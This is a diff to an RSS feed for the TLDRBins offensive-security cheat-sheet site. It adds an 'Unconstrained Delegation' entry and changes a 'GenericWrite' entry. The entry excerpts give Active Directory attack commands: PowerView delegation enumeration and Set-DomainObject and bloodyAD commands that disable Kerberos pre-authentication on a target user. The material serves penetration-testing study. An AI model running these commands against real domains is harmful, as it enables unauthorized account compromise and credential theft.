@@ -6,7 +6,15 @@
     <description>Recent content in Ticket Granting Ticket on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
+    <lastBuildDate>Sat, 23 Nov 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://tldrbins.github.io/@ticket-granting-ticket/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Unconstrained Delegation</title>
+      <link>https://tldrbins.github.io/unconstrained_delegation/</link>
+      <pubDate>Sat, 23 Nov 2024 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/unconstrained_delegation/</guid>
+      <description>Abuse #1: Capture Ticket Windows 1. Check TRUSTED_FOR_DELEGATION . .\PowerView.ps1 Get-DomainComputer PS C:\programdata&amp;gt; Get-DomainComputer ...[SNIP]... logoncount : 131 badpasswordtime : 12/31/1600 4:00:00 PM distinguishedname : CN=SRV002,CN=Computers,DC=Example,DC=local objectclass : {top, person, organizationalPerson, user...} badpwdcount : 0 displayname : SRV002$ lastlogontimestamp : 11/23/2024 2:29:01 AM objectsid : S-1-5-21-422340810-923920092-1608110645-1103 samaccountname : SRV002$ localpolicyflags : 0 codepage : 0 samaccounttype : MACHINE_ACCOUNT countrycode : 0 cn : SRV002 accountexpires : NEVER whenchanged : 11/23/2024 2:26:27 PM instancetype : 4 usncreated : 16398 objectguid : e54dc358-b87f-49ad-8bcf-2029bf051006 operatingsystem : Windows Server 2019 Standard operatingsystemversion : 10.</description>
+    </item>
     <item>
       <title>Abuse Parent Child Domain Trusts</title>
       <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
@@ -40,7 +48,7 @@
       <link>https://tldrbins.github.io/genericwrite/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/genericwrite/</guid>
-      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Windows 1. Import PowerView . .\PowerView.ps1 PS C:\programdata&amp;gt; . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; | ConvertFrom-UACValue PS C:\programdata&amp;gt; Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3. Create a Cred Object (runas) [Optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 4. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred PS C:\programdata&amp;gt; Set-DomainObject -Identity &amp;#39;user&amp;#39; -XOR @{useraccountcontrol=4194304} -Verbose -C Set-DomainObject -Identity &amp;#39;user&amp;#39; -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain VERBOSE: [Get-Domain] Extracted domain &amp;#39;corp.</description>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Linux Windows # Enable Account (if Disabled) sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k remove uac &amp;lt;TARGET_USER&amp;gt; -f ACCOUNTDISABLE sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k add uac &amp;lt;TARGET_USER&amp;gt; -f DONT_REQ_PREAUTH 1. Import PowerView . .\PowerView.ps1 PS C:\programdata&amp;gt; . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; | ConvertFrom-UACValue PS C:\programdata&amp;gt; Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3.</description>
     </item>
     <item>
       <title>Kerberos</title>
